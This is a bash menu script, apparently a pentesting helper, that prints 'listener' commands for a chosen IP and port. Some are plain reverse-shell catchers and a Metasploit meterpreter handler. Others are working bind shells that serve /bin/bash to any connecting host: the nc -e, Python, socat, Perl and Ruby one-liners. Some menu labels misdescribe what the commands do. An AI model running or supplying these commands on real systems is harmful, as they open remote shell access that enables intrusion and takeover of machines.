#!/bin/bash

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
RESET='\033[0m'

open_listener() {
    local l=$1
    local ip=$2
    local port=$3

    case "$l" in
        "Netcat")
            echo "nc -lvnp $port"
            ;;
        "Netcat (with -e support)")
            echo "nc -lvnp $port -e /bin/bash"
            ;;
        "Python")
            echo "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('$ip',$port));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(['/bin/bash','-i'])\""
            ;;
        "Python3")
            echo "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('$ip',$port));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(['/bin/bash','-i'])\""
            ;;
        "Socat")
            echo "socat TCP-LISTEN:$port,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
            ;;
        "Powercat")
            echo "powercat -l -p $port -v -t 1000"
            ;;
        "Rlwrap Netcat")
            echo "rlwrap nc -lvnp $port"
            ;;
        "Pwncat")
            echo "python3 -m pwncat -lp $port"
            ;;
        "Rustcat")
            echo "rcat listen -p $port"
            ;;
        "Metasploit")
            echo "msfconsole -q -x \"use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; run\""
            ;;
        "OpenSSL")
            echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port $port"
            ;;
        "Ncat (SSL)")
            echo "ncat --ssl -lvnp $port"
            ;;
        "PHP")
            echo "php -S $ip:$port"
            ;;
        "Ruby")
            echo "ruby -rsocket -e 'Socket.new(2,1,6).bind(Socket.sockaddr_in($port,\"$ip\")).listen(1).accept.each_line{|l|puts l;IO.popen(l.chomp,\"r\"){|p|puts(p.readline)}}.close'"
            ;;
        "Perl")
            echo "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($port,INADDR_ANY));listen(S,SOMAXCONN);while(1){accept(C,S);if(!fork()){exec(\"/bin/bash -i <&3 >&3 2>&3\")}}'"
            ;;
        *)
            echo -e "${RED}Listener type not supported: $l${RESET}"
            ;;
    esac
}

menu() {
    lista=("Netcat" "Netcat (with -e support)" "Python" "Python3" "Socat" "Powercat" 
             "Rlwrap Netcat" "Pwncat" "Rustcat" "Metasploit" "OpenSSL" "Ncat (SSL)" 
             "PHP" "Ruby" "Perl" "Exit")
    for i in "${!lista[@]}"; do
        echo "$((i + 1)). ${lista[i]}"
    done
}

while true; do
   menu
    echo -e "${YELLOW}Open a Listener <Sh0zack> ${RESET}"

    read -p "Enter your choice: " choice

    case $choice in
        1)
            l="Netcat"
            ;;
        2)
            l="Netcat (with -e support)"
            ;;
        3)
            l="Python"
            ;;
        4)
            l="Python3"
            ;;
        5)
            l="Socat"
            ;;
        6)
            l="Powercat"
            ;;
        7)
            l="Rlwrap Netcat"
            ;;
        8)
            l="Pwncat"
            ;;
        9)
            l="Rustcat"
            ;;
        10)
            l="Metasploit"
            ;;
        11)
            l="OpenSSL"
            ;;
        12)
            l="Ncat (SSL)"
            ;;
        13)
            l="PHP"
            ;;
        14)
            l="Ruby"
            ;;
        15)
            l="Perl"
            ;;
        16)
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid choice, please try again.${RESET}"
            continue
            ;;
    esac
	
    read -p "Enter IP address: " ip
    read -p "Enter port number: " port

    cmd=$(open_listener "$l" "$ip" "$port")
    echo -e "${YELLOW}Listener command:${RESET}"
    echo -e "${CYAN}$cmd${RESET}"
    read -p "Press any key to continue..."
done
